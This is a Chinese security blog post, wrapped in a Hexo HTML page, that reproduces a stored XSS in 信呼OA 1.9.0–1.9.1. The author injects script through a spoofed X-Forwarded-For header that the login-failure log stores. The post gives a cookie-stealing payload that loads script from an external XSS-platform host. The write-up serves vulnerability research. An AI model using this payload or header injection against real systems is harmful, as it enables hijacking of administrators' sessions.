@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="信呼oa 1.9.0-1.9.1 储存型xss一、漏洞简介二、漏洞影响信呼oa 1.9.0-1.9.1 三、复现过程首先搭建好之后跳转到一个登录页面 输入刚开始安装时设置的管理员usname paword然后点击登陆，然后抓包查看传参，然后去寻找登陆模块的源代码，根据传参的追踪，我们很快就能追踪到这个文件webmain\model\loginMode.php 然后我在这个登陆文件loginMode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E4%BF%A1%E5%91%BCoa/%E4%BF%A1%E5%91%BCoa%201.9.0-1.9.1%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="信呼oa 1.9.0-1.9.1 储存型xss一、漏洞简介二、漏洞影响信呼oa 1.9.0-1.9.1 三、复现过程首先搭建好之后跳转到一个登录页面 输入刚开始安装时设置的管理员usname paword然后点击登陆，然后抓包查看传参，然后去寻找登陆模块的源代码，根据传参的追踪，我们很快就能追踪到这个文件webmain\model\loginMode.php 然后我在这个登陆文件loginMode">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId33.png">
+<meta property="article:published_time" content="2022-07-08T06:26:11.562Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.297Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-信呼oa/信呼oa 1.9.0-1.9.1 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E4%BF%A1%E5%91%BCoa/%E4%BF%A1%E5%91%BCoa%201.9.0-1.9.1%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.562Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="信呼oa-1-9-0-1-9-1-储存型xss"><a href="#信呼oa-1-9-0-1-9-1-储存型xss" class="headerlink" title="信呼oa 1.9.0-1.9.1 储存型xss"></a>信呼oa 1.9.0-1.9.1 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>信呼oa 1.9.0-1.9.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先搭建好之后跳转到一个登录页面</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId24.png" alt="1.png">输入刚开始安装时设置的管理员<strong>usname paword</strong>然后点击登陆，然后抓包查看传参，然后去寻找登陆模块的源代码，根据传参的追踪，我们很快就能追踪到这个文件<code>webmain\model\loginMode.php</code></p>
+<p>然后我在这个登陆文件<code>loginMode.php</code>的第209行到215行发现了一些东西</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId25.png" alt="2.png"></p>
+<p>这里出现了一个<code>addlogs</code>函数，看名字应该是添加日志，在<code>logModel.php</code>中发现了他的定义</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId26.png" alt="3.png"></p>
+<p>这里是获取了信息然后给数组赋值，然后insert函数调用 在<code>mysql.php</code></p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId27.png" alt="4.png"></p>
+<p>很明显这里是插入语句的模板，这里就应该是登陆失败后，日志会记录下来前面看的到那些数组赋值的信息。</p>
+<p>通过查看Mysql日志发现，登录失败他会记录我们的Ip，那么就简单了，我们是否可以尝试使用<code>X-Forwarded-For</code>来改变他的ip，然后我们使用</p>
+<p><code>X-Forwarded-For:127.0.0.1</code>X-F-F成功更换后台Ip</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId28.png" alt="5.png">打个xss</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId29.png" alt="6.png">后台成功弹框</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId30.png" alt="7.png"></p>
+<p>打开XSS平台</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId31.png" alt="8.png">打一遍发现没用，获取不到cookie，F12看看咋回事</p>
+<p><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId32.png" alt="9.png">果然是xss代码出了问题构造xss代码，极限代码--&gt;多加//防止被转入之前--&gt;<code>&lt;sCRiPt/SrC=////xs.sb/Jwdu&gt;</code><img src="/resource/%E4%BF%A1%E5%91%BCoa1.9.0-1.9.1%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId33.png" alt="10.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7887">https://xz.aliyun.com/t/7887</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E4%BF%A1%E5%91%BCoa/%E4%BF%A1%E5%91%BCoa%201.9.0-1.9.1%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2r1q200rfy8v13odycuku" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E6%96%B0%E7%82%B9%E7%BD%91%E7%BB%9C%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%96%B0%E7%82%B9OA%20V7.0%20V8.0%20Getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
